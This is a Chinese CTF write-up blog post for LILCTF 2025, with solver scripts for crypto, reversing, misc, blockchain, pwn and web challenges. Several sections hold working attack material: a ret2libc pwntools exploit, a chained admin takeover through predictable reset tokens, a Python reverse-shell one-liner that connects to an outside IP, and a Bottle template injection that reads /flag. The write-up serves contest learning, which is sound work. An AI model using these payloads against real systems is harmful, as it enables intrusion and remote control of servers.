---
title: 2025lilctf
comments: true
date: 2025-08-17 00:22:46
tags:
  - CTF
categories:
  - 技术
---

## Crypto

### ez_math

AI梭

```python
# solver_ez_math.py
# Recover flag from given p and C where C = A^{-1} * diag(lambda1, lambda2) * A (mod p)

from Crypto.Util.number import long_to_bytes

def tonelli_shanks(n, p):
    # Solve x^2 ≡ n (mod p), p odd prime. Returns one root or raises ValueError.
    if n == 0:
        return 0
    if pow(n, (p - 1) // 2, p) != 1:
        raise ValueError("n is not a quadratic residue modulo p")
    if p % 4 == 3:
        return pow(n, (p + 1) // 4, p)
    # write p-1 = q * 2^s with q odd
    q = p - 1
    s = 0
    while q % 2 == 0:
        q //= 2
        s += 1
    # find a quadratic non-residue z
    z = 2
    while pow(z, (p - 1) // 2, p) != p - 1:
        z += 1
    c = pow(z, q, p)
    x = pow(n, (q + 1) // 2, p)
    t = pow(n, q, p)
    m = s
    while t != 1:
        # find lowest i (0 < i < m) with t^(2^i) == 1
        i = 1
        t2i = (t * t) % p
        while t2i != 1:
            i += 1
            t2i = (t2i * t2i) % p
            if i == m:
                raise ValueError("Tonelli-Shanks failed")
        b = pow(c, 1 << (m - i - 1), p)
        x = (x * b) % p
        c = (b * b) % p
        t = (t * c) % p
        m = i
    return x

def eigenvalues_2x2_mod_p(C, p):
    # C is [[a,b],[c,d]] modulo p
    a, b = C[0]
    c, d = C[1]
    a %= p; b %= p; c %= p; d %= p
    tr = (a + d) % p
    det = (a * d - b * c) % p
    disc = (tr * tr - 4 * det) % p
    sqrt_disc = tonelli_shanks(disc, p)
    inv2 = (p + 1) // 2  # inverse of 2 mod p since p is odd prime
    lam1 = ((tr + sqrt_disc) * inv2) % p
    lam2 = ((tr - sqrt_disc) * inv2) % p
    return lam1, lam2

def try_decode(lam1, lam2):
    b1 = long_to_bytes(lam1)
    b2 = long_to_bytes(lam2)
    candidates = []
    for a, b in [(b1, b2), (b2, b1)]:
        inner = a + b
        try:
            s = inner.decode('utf-8')
        except UnicodeDecodeError:
            s = None
        candidates.append((inner, s))
    return candidates

def main():
    # Replace with your given p and C (C as 2x2 list of ints modulo p)
    p = 9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161
    C = [
        [7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645,
         7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801],
        [7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808,
         2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872],
    ]

    lam1, lam2 = eigenvalues_2x2_mod_p(C, p)
    print(f"lambda candidates (mod p): {lam1}, {lam2}")

    cand = try_decode(lam1, lam2)
    for idx, (raw, maybe_text) in enumerate(cand, 1):
        print(f"Candidate {idx} (bytes): {raw}")
        if maybe_text is not None:
            print(f"Candidate {idx} (utf-8): {maybe_text}")
            print(f"With braces: LILCTF{{{maybe_text}}}")

if __name__ == "__main__":
    main()
```

![image-20250817002925200](https://img.0a0.moe/od/01tklsjzed3nlkebjoofbzvwbutm4lqauo)

题意是将flag构建对角矩阵并进行一次相似变换，但是通过相似变换特征值不变，因此求矩阵特征值即可得到原来的flag。

### mid_math

AI梭

```python
from sage.all import *
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes
from Crypto.Util.Padding import pad, unpad

# ========== 题目给定参数 ==========
p = 14668080038311483271
C_list = [[11315841881544731102, 2283439871732792326, 6800685968958241983, 6426158106328779372, 9681186993951502212],
          [4729583429936371197, 9934441408437898498, 12454838789798706101, 1137624354220162514, 8961427323294527914],
          [12212265161975165517, 8264257544674837561, 10531819068765930248, 4088354401871232602, 14653951889442072670],
          [6045978019175462652, 11202714988272207073, 13562937263226951112, 6648446245634067896, 13902820281072641413],
          [1046075193917103481, 3617988773170202613, 3590111338369894405, 2646640112163975771, 5966864698750134707]]

D_list = [[1785348659555163021, 3612773974290420260, 8587341808081935796, 4393730037042586815, 10490463205723658044],
          [10457678631610076741, 1645527195687648140, 13013316081830726847, 12925223531522879912, 5478687620744215372],
          [9878636900393157276, 13274969755872629366, 3231582918568068174, 7045188483430589163, 5126509884591016427],
          [4914941908205759200, 7480989013464904670, 5860406622199128154, 8016615177615097542, 13266674393818320551],
          [3005316032591310201, 6624508725257625760, 7972954954270186094, 5331046349070112118, 6127026494304272395]]

msg = b"\xcc]B:\xe8\xbc\x91\xe2\x93\xaa\x88\x17\xc4\xe5\x97\x87@\x0fd\xb5p\x81\x1e\x98,Z\xe1n`\xaf\xe0%:\xb7\x8aD\x03\xd2Wu5\xcd\xc4#m'\xa7\xa4\x80\x0b\xf7\xda8\x1b\x82k#\xc1gP\xbd/\xb5j"
# ==================================

K = GF(p)
C = Matrix(K, C_list)
D = Matrix(K, D_list)

# 1) 特征分解：取 C 的全部右特征向量，形成完整基
ev = C.eigenvectors_right()
pairs = []
for lam, vecs, mult in ev:
    v = vecs[0]
    pairs.append((lam, v))

# 构造可逆矩阵 P
P = Matrix(K, [v for (_, v) in pairs]).transpose()
Pinv = P.inverse()

# 2) 在这个基下对角化 D
D_diag = Pinv * D * P
lam_list = [lam for (lam, _) in pairs]
mu_list  = [D_diag[i,i] for i in range(len(pairs))]

# 3) 解离散对数
mods, ress = [], []
for lam, mu in zip(lam_list, mu_list):
    if lam == 0:
        continue   # λ=0 不提供信息
    ord_lam = lam.multiplicative_order()
    if mu == 1:
        k_i = 0
    else:
        k_i = discrete_log(mu, lam, ord=ord_lam)   # Sage 内置 Pohlig–Hellman
    mods.append(ord_lam)
    ress.append(Integer(k_i))

# 4) CRT 合并
L = lcm(mods)
k0 = crt(ress, mods) % L

# 5) 抬升到合法区间 [2^62, p]
low = Integer(2**62)
if k0 < low:
    k = k0 + ((low - k0 + L - 1) // L) * L
else:
    k = k0
assert k <= p

print(f"[+] recovered key int = {k}")

# 6) AES 解密
key_bytes = pad(long_to_bytes(int(k)), 16)   # 与题目加密方式一致
aes = AES.new(key_bytes, AES.MODE_ECB)
pt = unpad(aes.decrypt(msg), 64)
print("Recovered flag:", pt.decode())
```

![image-20250817003139269](https://img.0a0.moe/od/01tklsjzakin22m32u3bbkh4y3gd7vfp3j)

题意构造了个矩阵，然后使用key对其幂次化，再使用key对flag AES加密。因此要恢复出key，首先要对C特征分解，然后在这个基下对角化D，再解离散对数，使用CRT合并找到最终的key，然后解AES即可得

## Misc

### PNG Master

**part1**文件结尾

![image-20250817003414803](https://img.0a0.moe/od/01tklsjzdrv2jpiwe44va27dimlcrvfo36)

![image-20250817003418696](https://img.0a0.moe/od/01tklsjze4xtqzntamdzaygg6zphusgtq6)

**part2**

![image-20250817003603026](https://img.0a0.moe/od/01tklsjzhwnj65vnscyfajvssfc4lvoui5)

![image-20250817003640879](https://img.0a0.moe/od/01tklsjzf7yblcdt32lfcydwgncid6cboi)

**part3**

binwalk得到个压缩包

![image-20250817003807533](https://img.0a0.moe/od/01tklsjzhkkpshdwjdtvdzk44cr7hdokgs)

hint 0宽隐写

![image-20250817003924003](https://img.0a0.moe/od/01tklsjzaf34etdvy7cfej4qq7dpkoeg5x)

secret.bin

![image-20250817004032991](https://img.0a0.moe/od/01tklsjzdmfrx5fjmv4vgzdelzw7cj4mp7)

拼接起来From hex得`LILCTF{Y0u_4r3_Mas7er_in_PNG}`

### v我50(R)MB

Content-Length被限制10086，想办法解除限制。尝试的过程就不说了，反正最后nc手动发http请求，发现有IEND，提取出来即得图片

![image-20250817004315396](https://img.0a0.moe/od/01tklsjzg5p3ifgn2q3rajfoaht5hhj2pt)

<img src="https://img.0a0.moe/od/01tklsjzenb72a6y7azrfl3ullayra76qi" alt="test123" style="zoom:33%;" />

### 提前放出附件

根据题目名称以及描述里的日期，又看到里面的zip加密套tar，立刻想到了ciscn半决那两个附件。bkcrack明文攻击得到。记得很清楚是因为也干过，而且那时候某个群里面一直在说明文攻击（笑）

![image-20250817004640724](https://img.0a0.moe/od/01tklsjzhbzw3cqaxsp5c3eadlabhpm7d5)

不过有点不一样的是ciscn当时的tar好像是deflate，不知道怎么爆，这个只是store直接tar结尾padding 00就行

## PWN

### 签到

标准的ret2libc，好久没玩了，复制以前的脚本调整下就能跑

```python
from pwn import *

context(log_level='debug', os='linux')
p = remote('challenge.xinshi.fun', 48056)
pwn_elf = ELF('./pwn')
libc_elf = ELF('./libc.so.6')

puts_plt = pwn_elf.plt['puts']
main_addr = pwn_elf.symbols['main']
puts_got = pwn_elf.got['puts']
libc_sh_addr = 0x1D8678
pop_rdi_ret = 0x0000000000401176
ret_addr = 0x000000000040101a

payload1 = b'a' * (0x70+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(b"What's your name?\n", payload1)
puts_leak = u64(p.recv()[:6] + b'\0\0')
print(hex(puts_leak))
libc_base = puts_leak - libc_elf.symbols['puts']
print(hex(libc_base))
sh_addr = libc_base + libc_sh_addr
sys_addr = libc_base + libc_elf.symbols['system']
payload2 = b'a' * (0x70+8) + p64(pop_rdi_ret) + p64(sh_addr) + p64(ret_addr) + p64(sys_addr)
p.sendline(payload2)
p.sendline(b'cat /flag')

p.interactive()
```

## Reverse

### 1'M no7 A rO6oT

~~第一眼没看出来怎么运行powershell脚本的~~。010里打开mp3翻到个script标签，提取出来，然后把执行的那些换成打印来输出解密，逐个逐个手动解

![image-20250817201807154](https://img.0a0.moe/od/01tklsjza7zxz6646gdbh3xjku7ijoy3su)

最后得到请求了bestudding.jpg这个文件，同样下载下来同样方法解密两次

![image-20250817005750000](https://img.0a0.moe/od/01tklsjzf4avj5pdnojrfjitbbcjp6zicb)

### ARM ASM

Java层比对，送入native加密，静态注册函数，一个看不懂的加密以及换表base64，先手动解换表Base64，然后AI写脚本

```python
encode_byte = [0x92,0xb7,0x7c,0x0b,0xbc,0x6b,0xb2,0x39,0x7d,0x13,0xa1,0x50,0x72,0x20,0x48,0x62,0x34,0x61,0xc3,0xb0,0x54,0xeb,0x33,0x6d,0xca,0x35,0x72,0x5b,0xb7,0x66,0xf2,0xb6,0x69,0x93,0xbc,0x62,0xaa,0x33,0x67,0xf3,0x31,0x6b,0x9b,0x2d,0x6c,0x3b,0xaf,0x6c]
t = [0x0D, 0x0E, 0x0F, 0x0C, 0x0B, 0x0A, 0x09, 0x08, 0x06, 0x07, 0x05, 0x04, 0x02, 0x03, 0x01, 0x00]

from typing import ByteString

def ror8(x: int, n: int) -> int:
    x &= 0xFF
    return ((x >> n) | ((x << (8 - n)) & 0xFF)) & 0xFF

def decrypt_48_bytes(b64_decoded: ByteString, t_bytes: ByteString) -> bytes:
    """
    b64_decoded: Base64 解码后的 48 字节密文
    t_bytes: 16 字节的 t
    返回：48 字节明文
    """
    assert len(b64_decoded) == 48
    assert len(t_bytes) == 16
    b = bytearray(b64_decoded)
    t = bytes(t_bytes)

    # 1) 逆位旋
    for i in range(0, 48, 3):
        b[i]     = ror8(b[i], 3)   # 还原第 0 个字节（加密时 ROL3）
        b[i + 1] = ror8(b[i + 1], 7)  # 还原第 1 个字节（加密时 ROL7 == ROR1）
        # b[i + 2] 保持不变

    # 2) 分块逆置换+异或
    # 三个块使用的 k 分别为：k0=t, k1=t, k2=t^1
    keys = [
        t,
        t,
        bytes([tb ^ 0x01 for tb in t]),
    ]

    for blk_idx in range(3):
        k = keys[blk_idx]
        block = b[16*blk_idx:16*(blk_idx+1)]

        # 先去掉 XOR：perm = permute(P, k)
        perm = bytes([block[j] ^ k[j] for j in range(16)])

        # 逆置换：把 perm[j] 放回到 P[k[j]&0x0F]
        orig = bytearray(16)
        for j in range(16):
            idx = k[j] & 0x0F  # vqtbl1q_s8 只用低 4 位做索引
            orig[idx] = perm[j]
        b[16*blk_idx:16*(blk_idx+1)] = orig

    return bytes(b)


print(decrypt_48_bytes(encode_byte, t))
# LILCTF{ez_arm_asm_meow_meow_meow_meow_meow_meow}
```

### Oh_My_Uboot

U-boot，不懂，查资料问AI，用qemu跑起来，发现要输入密码，附加个gdb给IDA调试用。架构来自于里面的字符串，其他的也跑不起

![image-20250817010754338](https://img.0a0.moe/od/01tklsjzcotywkoyig6nglycrhy5ph7e5f)

```bash
qemu-system-arm -M vexpress-a9 -nographic -kernel re-u-boot -gdb tcp::23946 -S
```

逐步跟踪到输入密码的函数，一个while 1，解密字符串提示输入密码，然后获取输入，传入密码处理校验。下面是对密码处理并校验的函数

![屏幕截图 2025-08-16 032156](https://img.0a0.moe/od/01tklsjzcvn5jurrhdajaishchqrwdateo)

得到是异或0x72然后换表base58

![屏幕截图 2025-08-16 032208](https://img.0a0.moe/od/01tklsjzbh2btjx44yrrfip3ikso6ozv7w)

### Qt_Creator

没看到有什么加密函数，而且出得很快，怀疑是明文比对，使用Cheat Engine搜字符串没搜到。先让程序跑起来，然后在输入注册码的时候IDA Attach上去，在0x410100打断点逐步调试瞎找，真找到了

![屏幕截图 2025-08-16 163738](https://img.0a0.moe/od/01tklsjzcntl2ncyobtng25pisb7p5kfhn)

### obfusheader.h

根据题意，动态调试，找到输入flag的地方

![image-20250817011531615](https://img.0a0.moe/od/01tklsjzh6h7q5l526qrgjpn5fvfi4uzec)

然后给存储输入flag的地方打个读写断点，每次断的时候看看干了什么就行

```python
'''
字节异或rand

LILCTF{11111111111111111111111111111111}
[0x3A, 0x05, 0xF4, 0x3E, 0x30, 0x01, 0x83, 0x61, 0x96, 0x72, 0xF9, 0x02, 0xB6, 0x56, 0xE5, 0x58, 0x4F, 0x7D, 0x70, 0x50, 0x55, 0x71, 0x94, 0x3E, 0x22, 0x7C, 0x98, 0x4E, 0xC8, 0x10, 0xF1, 0x6D, 0x47, 0x26, 0xAF, 0x44, 0xCC, 0x30, 0x7D, 0x4E]

前四位后四位调转

然后取反
'''

encrypt = [0x5C, 0xAF, 0xB0, 0x1C, 0xFC, 0xEF, 0xC7, 0x8D, 0x01, 0xCF, 0x00, 0x39, 0x13, 0xBC, 0x47, 0x2F, 0x0C, 0x7E, 0xFD, 0x8D, 0xAA, 0x0F, 0xD2, 0xFA, 0xF8, 0x68, 0x81, 0xFD, 0xA6, 0xA8, 0x06, 0x1C, 0xCC, 0x7B, 0x25, 0xBE, 0x67, 0xB9, 0xDD, 0x1B]

origin = [0x4c,0x49,0x4c,0x43,0x54,0x46,0x7b,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x7d]
xor_final = [0x3A, 0x05, 0xF4, 0x3E, 0x30, 0x01, 0x83, 0x61, 0x96, 0x72, 0xF9, 0x02, 0xB6, 0x56, 0xE5, 0x58, 0x4F, 0x7D, 0x70, 0x50, 0x55, 0x71, 0x94, 0x3E, 0x22, 0x7C, 0x98, 0x4E, 0xC8, 0x10, 0xF1, 0x6D, 0x47, 0x26, 0xAF, 0x44, 0xCC, 0x30, 0x7D, 0x4E]
xor = []
for i in range(len(origin)):
    xor.append(origin[i] ^ xor_final[i])

for i in range(len(encrypt)):
    encrypt[i] = ~encrypt[i] & 0xFF

for i in range(len(encrypt)):
    encrypt[i] = ((encrypt[i] << 4) | (encrypt[i] >> 4)) & 0xFF

for i in range(len(encrypt)):
    encrypt[i] = encrypt[i] ^ xor[i]

print("".join([chr(i) for i in encrypt]))
# LILCTF{wH@7_IS_dATaF1Ow_c4N_lT_bE_3aten}
```

## Web

### Ekko_note

审计代码，执行命令->check_time->时间api返回>=2066->修改时间api->需要admin->忘记admin密码->利用uuid8生成token->token可预测->利用token可以重置密码->可以登录admin

```python
import requests
import random
import uuid

host = 'http://challenge.xinshi.fun:44179/'

user_name = 'test1'
user_pwd = '12345678'

def padding(input_string):
    byte_string = input_string.encode('utf-8')
    if len(byte_string) > 6: byte_string = byte_string[:6]
    padded_byte_string = byte_string.ljust(6, b'\x00')
    padded_int = int.from_bytes(padded_byte_string, byteorder='big')
    return padded_int

s = requests.Session()

r = s.post(host+'/login', data={'username': user_name, 'password': user_pwd})
r = s.get(host+'/server_info')
server_start_time = r.json()['server_start_time']
s.get(host+'/logout')
s.post(host+'/forgot_password', data={'email': 'admin@example.com'})
random.seed(server_start_time)
print(str(uuid.uuid8(a=padding('admin'))))
```

得到token后重置admin密码，然后设置时间api为自己的服务器

```python
import requests

admin_name = 'admin'
admin_pwd = '12345678'
admin_email = 'admin@example.com'

host = 'http://challenge.xinshi.fun:44179/'

s = requests.Session()

r = s.post(host+'/login', data={'username': admin_name, 'password': admin_pwd})
r = s.post(host+'/admin/settings', data={'time_api': 'http://ip:port'})
```

然后利用RCE接口，使用python反弹shell

```python
import os,subprocess,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('40.119.192.139',30003));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])
```

![屏幕截图 2025-08-16 221234](https://img.0a0.moe/od/01tklsjzbszrgxb53nn5ejzdlzjo4cbjn5)

### ez_bottle

问了下AI，AI说可以直接`% include ("/flag")`，试了提示不能绝对路径要用相对路径。然后测试各种长度的`../`都不行，然后又看了下文档说`%`可以执行Python，使用`subprocess`复制到当前文件夹

```python
%import subprocess;subprocess.run(["cp","/flag","test1.txt"])
```

然后再`include`读取文件

```python
% include ("test1.txt")
```

![屏幕截图 2025-08-16 193315](https://img.0a0.moe/od/01tklsjzg4kujy5a27ebb3ci23koz7fip5)

## Blockchain

部署合约，获取合约字节码

![image-20250817123121053](https://img.0a0.moe/od/01tklsjzhsj7bnzkvn7vazkpfjnthlbhv2)

反编译，https://ethervm.io/decompile和JEB都用了一下，感觉差不多，反编译完看一下，然后是`0x5cc4d812`这个sig的函数传入一个值，经过异或后，keccak256与slot里的数据进行比对

```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider('http://106.15.138.99:8545/'))

contract_address = '0xe8357FdCC98EB762abC546E5aC5853e4FE85D878'

table_storage_slot = 0
table_slot_data = w3.eth.get_storage_at(contract_address, table_storage_slot)
print(table_slot_data)

from eth_hash.auto import keccak
table_storage_slot = Web3.to_int(keccak(bytes.fromhex('0000000000000000000000000000000000000000000000000000000000000000')))
table_slot_data = w3.eth.get_storage_at(contract_address, table_storage_slot)
print(table_slot_data)
table_slot_data = w3.eth.get_storage_at(contract_address, table_storage_slot+1)
print(table_slot_data)
table_slot_data = w3.eth.get_storage_at(contract_address, table_storage_slot+2)
print(table_slot_data)
```

拿了之前出过但没用上的题目exp脚本，打印一下slot，得到结果后异或一下

![image-20250817123514425](https://img.0a0.moe/od/01tklsjzahwpsxtldlm5clzcvrlhrgt6fs)

丢给AI写交互解题脚本

```python
from web3 import Web3

# 连接到 RPC
w3 = Web3(Web3.HTTPProvider("http://106.15.138.99:8545/"))

# 部署合约的地址
contract_address = Web3.to_checksum_address("0xe8357FdCC98EB762abC546E5aC5853e4FE85D878")

# 你的账户（必须解锁或有私钥）
account = w3.eth.account.from_key("<private_key>")

# 函数 selector
func_selector = "0x5cc4d812"

# 需要传入的字符串
payload_str = "33417348334c315f554e4445725f7448655f5365343f7d"
payload_bytes = payload_str.encode()

# ABI 编码：这里假设函数签名是 solve(string) 或 solve(bytes)
# 使用 eth_abi 手动编码
from eth_abi import encode

# 编码成 bytes
encoded_arg = encode(["string"], [payload_str])   # 如果是 string 类型

# 拼接 calldata
calldata = func_selector + encoded_arg.hex()

# 构造交易
tx = {
    "from": account.address,
    "to": contract_address,
    "data": calldata,
    "gas": 500000,
    "gasPrice": w3.to_wei("1", "gwei"),
    "nonce": w3.eth.get_transaction_count(account.address),
    "chainId": 21348
}


# 签名并发送
signed_tx = w3.eth.account.sign_transaction(tx, account.key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
print("Tx sent:", tx_hash.hex())

# 等待执行
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print("Receipt:", receipt)

# 调用 isSolved 检查
isSolved_selector = w3.keccak(text="isSolved()")[:4].hex()
result = w3.eth.call({
    "to": contract_address,
    "data": isSolved_selector
})
print("isSolved:", int(result.hex(), 16) != 0)
```

![image-20250817123615304](https://img.0a0.moe/od/01tklsjzax4ewpaiohxzfzehw5fbmd7emg)

![image-20250817123640786](https://img.0a0.moe/od/01tklsjzgkcf2hy4jpgvhl2bomc3q26asf)
